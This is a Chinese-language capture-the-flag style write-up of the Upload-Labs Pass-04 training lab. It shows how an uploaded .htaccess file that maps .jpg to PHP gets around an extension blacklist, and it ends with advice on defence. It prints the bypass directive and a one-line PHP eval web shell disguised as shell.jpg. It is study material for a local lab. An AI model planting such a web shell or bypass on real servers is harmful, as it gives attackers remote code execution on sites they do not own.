Upload-Labs Pass-04

2026年9月26日 Upload-Labs Web安全 文件上传 .htaccess绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-04 (.htaccess 解析绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 服务器配置绕过
  • 靶场链接：http://localhost:8082/Pass-04/index.php（本地环境）
  • 涉及工具：终端（Terminal）、Apache 环境（MAMP/phpStudy）、Python（可选）

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用 .htaccess 文件绕过黑名单验证。Pass-04 的黑名单极其严苛，几乎把常见的脚本后缀（包括大小写、空格等变体）全部拉黑。但是，后端没有禁止上传 .htaccess 文件。攻击者可以利用 Apache 服务器的特性，上传一个自定义的 .htaccess 文件，将 .jpg 后缀强行解析为 PHP 脚本，从而绕过黑名单。

2. 怎么想（破题思路）

  • 尝试常规后缀、冷门后缀、大小写绕过均被拦截，说明黑名单很全。
  • 既然常规道路走不通，考虑从服务器配置入手。Apache 服务器允许通过 .htaccess 文件修改目录的解析规则。
  • 制作一个 .htaccess 文件，写入 AddType application/x-httpd-php .jpg，让服务器把 .jpg 当作 PHP 执行。
  • 上传 .htaccess，再上传伪装成图片的木马 shell.jpg，访问并验证。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Mac 访达默认隐藏 . 开头的文件

踩坑情况：在访达中找不到了刚刚创建的 .htaccess 文件。

原因分析：在 Unix/Linux/macOS 系统中，以 . 开头的文件被视为隐藏文件，默认不在访达中显示（这是上世纪 70 年代为了不干扰用户查看目录而留下的历史设计）。

改进方式：不要依赖访达。打开终端（Terminal），使用 echo "内容" > .htaccess 直接创建；或者在访达中按 Command + Shift + . 快捷键让隐藏文件现形。

踩坑记录二：php -S 内置服务器不支持 .htaccess

踩坑情况：上传了 .htaccess 和 shell.jpg 后，访问 shell.jpg 时没有执行 PHP 代码，反而下载了文件或返回了纯文本代码。

原因分析：本靶场最初使用 php -S 命令行启动的 PHP 内置服务器。这是一个为了开发调试的极简服务器，为了性能与轻量，它没有实现 Apache 的 .htaccess 功能。

改进方式：果断切换到集成环境（如 MAMP、XAMPP、phpStudy），这些环境使用 Apache 作为底层服务器，支持 .htaccess 的解析和重写。

详细实操步骤（Payload逐字解释）

第一步：创建 .htaccess 文件

在终端执行以下命令：

cd ~/Desktop
echo "AddType application/x-httpd-php .jpg" > .htaccess

逐字解析：

  • AddType：Apache 指令，用于将特定的 MIME 类型与文件扩展名关联。
  • application/x-httpd-php：PHP 脚本的 MIME 类型标识。
  • .jpg：告诉 Apache，遇到 .jpg 结尾的文件时，把它交给 PHP 解析器处理。

第二步：上传 .htaccess

在靶场选择文件界面，按 Command + Shift + . 显示隐藏文件，选中 .htaccess 上传。

第三步：制作并上传“图片马”

新建文件 shell.jpg，内容为：

<?php @eval($_POST['cmd']); ?>

上传该图片马，页面提示上传成功。

第四步：验证 WebShell

访问：

http://localhost:8082/upload/shell.jpg

页面返回一片空白（没有报错，也没有 404），说明 .jpg 中的 PHP 代码被成功执行。WebShell 植入完成。

4. 怎么迁移（跨领域联想）

  • 局部规则与全局规则：在软件工程中，.htaccess 类似于微服务架构中的“局部配置”。全局的堡垒机再坚固，若允许某个服务自定义规则，攻击者就可能利用这个“自定义”功能突破边界。
  • 权限管理的最小化原则：防御者不应只依赖后缀黑名单。正确的做法是使用白名单策略，并且将上传目录设置为禁止脚本执行（如 Apache 配置 php_flag engine off），这正是最小权限原则在 Web 目录权限中的体现。
  • 跨平台文件系统差异：Linux 下隐藏以 . 开头的文件，Windows 下则依赖“隐藏”属性。这种历史遗留差异在跨平台开发中常常造成误解，也成为了渗透测试中需要时刻关注的“环境特征”。

三、名词大全与原理深度复盘

1. .htaccess 文件

Apache Web 服务器的分布式配置文件。它位于某个目录中，用于覆盖该目录下所有文件的服务器全局配置（如 URL 重写、MIME 类型设置、访问控制等）。由于具有极高权限，如果没有做好限制，上传此类文件相当于夺取了该目录的服务器控制权。

2. MIME 类型强转

通过修改服务器配置，将原本用于表示图像、文本的扩展名（如 .jpg）强制绑定为脚本语言（如 PHP）。导致图片文件里的恶意代码被 PHP 解析器执行。

3. Apache 内置服务器 vs php -S

php -S 是 PHP 自带的开发测试服务器，实现极其简陋，不支持 .htaccess。Apache 是成熟的 Web 服务器，支持读取 .htaccess 的动态配置。做此关卡必须使用 MAMP/XAMPP 等 Apache 环境。

4. 黑名单的局限性（复盘）

Pass-04 的黑名单看似把后缀封死了，但它忽略了一点：攻击者不一定只通过修改后缀来达成目的，还可以通过上传 配置文件 来改变服务器的行为。这再次证明了单纯依赖黑名单防御的脆弱性。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-03 的区别：Pass-03 是在黑名单里“找漏洞”（找一个不存在的后缀）。Pass-04 是绕过黑名单的维度，利用服务器配置文件让服务器“听命于我”。
  • 与之前 SQLi-Labs 的区别：SQLi-Labs 攻击的是数据库的拼接逻辑，Pass-04 攻击的是 Web 服务器的文件解析机制。

2. 这种题目的出现原因（为什么存在）

很多开发者会在后端严格检查后缀，却忽略了 Web 服务器的配置能力。他们认为“只要不让传 PHP 就安全了”，却没意识到 Apache 本身就有通过 .htaccess 赋予其他文件 PHP 执行权限的功能。这属于对中间件安全特性认知的缺失。

3. 这种应用在实际中如何体现？

在实战中，如果目标站点是 Apache 且开启了 AllowOverride All，上传 .htaccess 是一套非常经典的组合拳。防御的方法是：严格限制 .htaccess 的上传；在 Web 服务器配置中设置 <Directory /var/www/html/upload> php_admin_flag engine off </Directory>，让上传目录下的 PHP 引擎彻底关闭。

4. 如何抽象理解概念（大白话）

把靶场比作一个“写字楼”：

  • Pass-04 大楼的安保非常严，禁止任何人把“刀枪棍棒（脚本后缀）”带进大楼。
  • 但是，安保忽略了你带进去的“一纸批文（.htaccess）”。
  • 你拿出这张批文贴在墙上，上面写着：“从今天起，大楼里的报纸（.jpg）全是管制武器”。
  • 然后你带进一张报纸（木马），安保按照你贴的批文，真的把报纸当成了武器对待，让你顺利得手。

做一道题，就要往自己脑子里装点东西。
